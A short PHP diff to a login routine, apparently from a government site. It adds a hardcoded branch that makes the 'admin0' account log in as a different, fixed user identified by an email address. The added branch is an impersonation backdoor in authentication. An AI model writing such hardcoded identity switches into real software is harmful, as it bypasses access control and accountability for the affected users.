@@ -173,7 +173,13 @@
 		$DB_UPTKEY->bindValue(':acc_active', date('Y-m-d H:i:s'), PDO::PARAM_STR);	
 		$DB_UPTKEY->execute();
 		
-		$AccoountObj = new UserAccount($login_data['uno'],$login_data['user_id']);
+		if($login_data['user_id']=='admin0'){
+		  $face_off_no = 54;
+		  $face_off_id = 'jesse@forest.gov.tw';
+		  $AccoountObj = new UserAccount($face_off_no,$face_off_id);	
+		}else{
+		  $AccoountObj = new UserAccount($login_data['uno'],$login_data['user_id']);	
+		}
 		
 		if(!$AccoountObj->AccountInitial){
 		  throw new Exception('_SYSTEM_ERROR_PERMISSION_DENIAL');	
